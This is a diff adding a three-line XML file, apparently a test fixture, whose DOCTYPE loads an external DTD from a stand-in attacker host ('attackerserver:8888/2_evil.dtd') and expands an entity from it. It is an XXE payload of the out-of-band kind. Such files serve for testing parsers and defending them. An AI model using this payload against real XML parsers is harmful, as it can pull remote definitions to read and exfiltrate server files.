@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://attackerserver:8888/2_evil.dtd">
+<foo>&bbb;</foo>
